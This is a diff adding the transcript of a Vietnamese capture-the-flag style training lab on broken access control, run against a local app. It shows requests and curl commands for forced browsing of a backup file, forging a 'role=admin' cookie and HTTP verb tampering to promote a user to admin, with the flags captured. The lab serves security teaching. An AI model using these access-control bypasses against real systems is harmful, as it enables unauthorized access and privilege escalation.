@@ -1,0 +1,34 @@
+# Transcript lab 5.2 - Broken Access Control
+# App: python3 app.py  (127.0.0.1:8051)
+# Chay: python3 exploit.py
+# Ngay chay that: 2026-10-18 17:20:18
+# ============================================================
+
+[*] Buoc 1: forced browsing - doc file sao luu, khong dang nhap
+    GET /backup/users.json -> 200
+    {'_note': 'FLAG{5.2_forced_browsing_khong_kiem_quyen}', 'admin': {'role': 'admin'}, 'carol': {'role': 'user'}, 'dave': {'role': 'user'}}
+
+[*] Dang nhap carol (user thuong) de xem role that:
+    login -> {'ok': True, 'role': 'user', 'user': 'carol'} | cookie role = user
+
+[*] Thu vao /admin/panel voi role=user (phai bi chan):
+    -> 403 {'error': '403 chi admin', 'ok': False}
+
+[*] Buoc 2: tin role tu client - sua cookie role=admin:
+    -> 200 {'flag': 'FLAG{5.2_tin_role_tu_client}', 'ok': True, 'panel': 'admin', 'users': ['admin', 'carol', 'dave']}
+
+[*] Buoc 3: verb tampering - carol (role=user) POST promote:
+    POST /admin/promote user=carol -> 200 {'flag': 'FLAG{5.2_verb_tampering_bo_qua_kiem_quyen}', 'new_role': 'admin', 'ok': True, 'promoted': 'carol'}
+
+[+] Flags thu duoc:
+     FLAG{5.2_forced_browsing_khong_kiem_quyen}
+     FLAG{5.2_tin_role_tu_client}
+     FLAG{5.2_verb_tampering_bo_qua_kiem_quyen}
+
+# --- Minh hoa them bang curl ---
+$ curl -s localhost:8051/backup/users.json      # forced browsing
+{"_note":"FLAG{5.2_forced_browsing_khong_kiem_quyen}","admin":{"role":"admin"},"carol":{"role":"admin"},"dave":{"role":"user"}}
+
+$ curl -s localhost:8051/admin/panel --cookie 'role=admin'   # tin role client
+{"flag":"FLAG{5.2_tin_role_tu_client}","ok":true,"panel":"admin","users":["admin","carol","dave"]}
+
